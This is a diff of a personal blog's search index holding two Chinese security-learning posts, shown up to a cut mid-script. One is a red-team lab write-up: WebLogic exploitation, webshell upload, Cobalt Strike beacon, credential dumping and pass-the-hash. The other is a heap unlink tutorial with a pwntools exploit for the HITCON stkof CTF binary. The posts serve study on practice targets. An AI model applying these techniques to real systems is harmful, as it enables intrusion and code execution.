@@ -2,57 +2,57 @@
 <search>
   <entry>
     <title>ATT&amp;CK红队评估二 内网靶场记录</title>
-    <url>/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</url>
+    <url>/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="attck红队评估二套靶场"><a class="markdownIt-Anchor" href="#attck红队评估二套靶场"></a> <strong>ATT&amp;CK红队评估二套靶场</strong></h1>
 <h2 id="0x00-环境搭建"><a class="markdownIt-Anchor" href="#0x00-环境搭建"></a> 0x00 环境搭建</h2>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005203929704.png" alt="image-20211005203929704" style="zoom: 80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005203929704.png" alt="image-20211005203929704" style="zoom: 80%;">
 <p>​		这里有个坑，就是WEB靶机密码是不对的，就离谱，我网上找了半天也没看到有人说这个问题，最后看到一个师傅的博客上说web靶机密码不对可以还原虚拟机快照，WEB靶机恢复到快照1.3即可</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005204330139.png" alt="image-20211005204330139" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005204330139.png" alt="image-20211005204330139" style="zoom:80%;">
 <p>靶机配置：</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006223721115.png" alt="image-20211006223721115" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006223721115.png" alt="image-20211006223721115" style="zoom:80%;">
 <h2 id="0x01-外网信息收集"><a class="markdownIt-Anchor" href="#0x01-外网信息收集"></a> 0x01 外网信息收集</h2>
 <p><strong>注：我这搭建的的环境不太对劲，不管我怎么操作，WEB机器一直连不上域网络，而且登陆就会提示此工作站与域的信任关系失效，猜测应该和配置这个靶场的时间有关了，最后我只能先用本地administrator账号启动web服务</strong></p>
 <p>​		攻击机在192.168.111.128，先进行端口服务扫描</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005231017582.png" alt="image-20211005231017582" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005231017582.png" alt="image-20211005231017582" style="zoom:80%;">
 <p>看到7001开放weblogic服务，访问console目录发现有登陆页面</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005231157395.png" alt="image-20211005231157395" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005231157395.png" alt="image-20211005231157395" style="zoom:80%;">
 <p>GitHub上找了一个weblogic扫描工具进行扫描https://github.com/tangxiaofeng7/Weblogic-scan，存在cve-2019-2725漏洞</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005231627720.png" alt="image-20211005231627720" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005231627720.png" alt="image-20211005231627720" style="zoom:80%;">
 <h2 id="0x02-利用"><a class="markdownIt-Anchor" href="#0x02-利用"></a> 0x02 利用</h2>
 <p>然后随便找了个利用工具上传冰蝎马</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005232541381.png" alt="image-20211005232541381" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005232541381.png" alt="image-20211005232541381" style="zoom:80%;">
 <p>使用工具连接</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/211005232733022.png" alt="image-20211005232733022" style="zoom: 67%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/211005232733022.png" alt="image-20211005232733022" style="zoom: 67%;">
 <p>执行命令查看基本信息，可以看到机器有双网卡，有存在域de1ay下</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005233002342.png" alt="image-20211005233002342" style="zoom:80%;">
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005233104949.png" alt="image-20211005233104949" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005233002342.png" alt="image-20211005233002342" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005233104949.png" alt="image-20211005233104949" style="zoom:80%;">
 <p>使用cs上线</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211005234435060.png" alt="image-20211005234435060" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211005234435060.png" alt="image-20211005234435060" style="zoom:80%;">
 <p>冰蝎执行powershell上线</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006000431936.png" alt="image-20211006000431936" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006000431936.png" alt="image-20211006000431936" style="zoom:80%;">
 <p>这里执行太久没有反应，我就多弄了一下，然后就这样了，emmm</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006000528210.png" alt="image-20211006000528210" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006000528210.png" alt="image-20211006000528210" style="zoom:80%;">
 <p>beacon提权</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006001051755.png" alt="image-20211006001051755" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006001051755.png" alt="image-20211006001051755" style="zoom:80%;">
 <p>看到密码是1qaz@WSX</p>
-<p><img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006001551621.png" alt="image-20211006001551621"></p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006002034050.png" alt="image-20211006002034050" style="zoom:80%;">
+<p><img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006001551621.png" alt="image-20211006001551621"></p>
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006002034050.png" alt="image-20211006002034050" style="zoom:80%;">
 <p>内外网端口探测，beacon命令portscan，我这环境和配置有点问题，其实我这台WEB机器不能连接上delay的域网络，登陆不了域内账号，我试了很多遍，最后只能先使用本地账号开启web服务，理论上这里可以看到10.10.10.201的pc机器。</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006214921960.png" alt="image-20211006214921960" style="zoom:80%;">
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006215008478.png" alt="image-20211006215008478" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006214921960.png" alt="image-20211006214921960" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006215008478.png" alt="image-20211006215008478" style="zoom:80%;">
 <p>由于以上原因，我先跳过横向移动过程，理论上面端口扫描是可以看得到域内10.10.10.201的win7的pc机的，这里直接手动上线这台机器进行下一步操作了，emmm。</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006215410344.png" alt="image-20211006215410344" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006215410344.png" alt="image-20211006215410344" style="zoom:80%;">
 <p>看域的名称</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006223346131.png" alt="image-20211006223346131" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006223346131.png" alt="image-20211006223346131" style="zoom:80%;">
 <p>再次扫描域网段10.10.10.0/24，发现10.10.10.10有可能就是域控</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image4036398.png" alt="image-20211006224036398" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image4036398.png" alt="image-20211006224036398" style="zoom:80%;">
 <h2 id="0x03-pth攻击"><a class="markdownIt-Anchor" href="#0x03-pth攻击"></a> 0x03 pth攻击</h2>
 <p>先抓取这台机器上的账号密码，然后pth攻击</p>
-<p><img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006225229969.png" alt="image-20211006225229969"></p>
+<p><img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006225229969.png" alt="image-20211006225229969"></p>
 <p>不过我这使用本机监听失败了，因为这个DC不出网，不过我看网上payload使用smb监听也失败了，emmm，可能真是我这个环境配的有问题，先到这，后面研究下，或者先换个靶场做</p>
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006225536118.png" alt="image-20211006225536118" style="zoom:80%;">
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20211006225714893.png" alt="image-20211006225714893" style="zoom:80%;">
-<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image226.png" alt="image-20211006230321226" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006225536118.png" alt="image-20211006225536118" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20211006225714893.png" alt="image-20211006225714893" style="zoom:80%;">
+<img src="/2021/08/23/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image226.png" alt="image-20211006230321226" style="zoom:80%;">
 <h2 id="0x04-使用其他漏洞渗透"><a class="markdownIt-Anchor" href="#0x04-使用其他漏洞渗透"></a> 0x04 使用其他漏洞渗透</h2>
 <p>​		看网上说可以使用MS17010，加msf派生shell，后续测试</p>
 <h2 id="0x05-权限维持知识"><a class="markdownIt-Anchor" href="#0x05-权限维持知识"></a> 0x05 权限维持(知识)</h2>
@@ -823,6 +823,91 @@
       </tags>
   </entry>
   <entry>
+    <title>unlink漏洞学习</title>
+    <url>/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="堆的unlink漏洞学习"><a class="markdownIt-Anchor" href="#堆的unlink漏洞学习"></a> 堆的unlink漏洞学习</h1>
+<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
+<p>做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT</p>
+<h2 id="unlink基本原理"><a class="markdownIt-Anchor" href="#unlink基本原理"></a> Unlink基本原理</h2>
+<p>Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/unlink.png" alt="unlink基本原理" style="zoom:67%;">
+<p>目的是为了把图中的P拿出来，然后使FD-&gt;bk=BK 以及BK-&gt;fd=FD，其实这里说的也已经很清楚<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2">CTF wiki unlink</a>，不过我就是不明白unlink的一个检查机制</p>
+<p>双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink</p>
+<p>块。当攻击者使用 free -12 和 shellcode 地址覆</p>
+<p>盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块</p>
+<p>（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><span class="hljs-built_in">malloc_printerr</span> (check_action, <span class="hljs-string">&quot;corrupted double-linked</span><br><span class="hljs-string">list&quot;</span>, P); <br></code></pre></td></tr></table></figure>
+<p>以及这个机制的绕过，这个机制主要是验证p-&gt; fd-&gt; bk == p 和 p-&gt; bk-&gt; fd == p</p>
+<p>绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2*偏移</p>
+<p>这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）</p>
+<p>不过做了一道题后理解就很清楚了，果然不能光看。</p>
+<h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof"></a> 2014 HITCON stkof</h2>
+<p>程序开启了canary和堆栈不可执行保护</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213154332.png" alt="检查" style="zoom:67%;">                       
+<p>程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213239564.png" alt="运行" style="zoom:67%;">
+<p>输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213308210.png" alt="输入1的函数" style="zoom:67%;">
+<p>输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213349366.png" alt="输入2的函数" style="zoom:67%;">
+<p>输入3是进行free的操作</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213416269.png" alt="输入3的操作" style="zoom:67%;">
+<p><strong>注意这里所有操作都是通过全局变量指针s来进行的</strong></p>
+<h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3>
+<ol>
+<li>
+<p>首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10</p>
+</li>
+<li>
+<p>在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。</p>
+</li>
+<li>
+<p>这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。</p>
+</li>
+<li>
+<p>编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址</p>
+</li>
+<li>
+<p>最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用</p>
+</li>
+</ol>
+<h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3>
+<p>首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213459651.png" alt="创建堆快" style="zoom:67%;">
+<p>查看全局变量s的位置，4个堆块的指针都记录在上面</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213531336.png" alt="全局变量查看" style="zoom:67%;">
+<p>然后修改chunk2伪造堆块</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213556648.png" alt="伪造的chunk2" style="zoom:67%;">
+<p>0是伪造堆块的prev_size，0x30是size</p>
+<p>0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置</p>
+<p>0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置</p>
+<p>然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态</p>
+<p>进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断</p>
+<p>p-&gt; fd-&gt; bk = = p 和 p-&gt; bk-&gt; fd ==p，这里p-&gt; fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=&gt;0x2846460=p，验证通过，然后p-&gt; bk-&gt; fd ==p的过程同上。</p>
+<p>然后进行unlink操作</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>
+<p>这里FD-&gt;bk和BK-&gt;fd都是chunk2在全局变量指针中的地址，最后会进行BK-&gt;fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213704244.png" alt="最后进行的BK->fd操作" style="zoom:67%;">
+<p>可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）</p>
+<p>然后进行修改chunk2的操作（先从全局变量取指针0x602150-&gt;0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213750481.png" alt="编辑chunk1" style="zoom:67%;">
+<p>这里0x602148和0x602150已经被修改为free_got和put_plt</p>
+<p>然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址</p>
+<p>进行free（2）的操作，实际上是put出put_plt泄露出真实地址</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213836064.png" alt="泄露的put真实地址" style="zoom:67%;">
+<p>后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。</p>
+<p>脚本如下，参考了https://bbs.pediy.com/thread-247007.htm</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,strings</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    p.send(strings)<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x30</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#创建4个堆快，第三个用来free的堆快不能是fastbin</span><br><br>target = <span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span><br>fd = target - <span class="hljs-number">0x18</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#伪造堆块的prev_size</span><br>payload += p64(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#伪造堆块的size</span><br>payload += p64(fd) + p64(bk)<br>payload += <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span><br>payload += p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)  <span class="hljs-comment">#更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>free(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br> <br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span> <br>payload2 += p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload2)<br><br>payload3 = p64(puts_plt)<br>edit(<span class="hljs-number">1</span>,payload3)<br><span 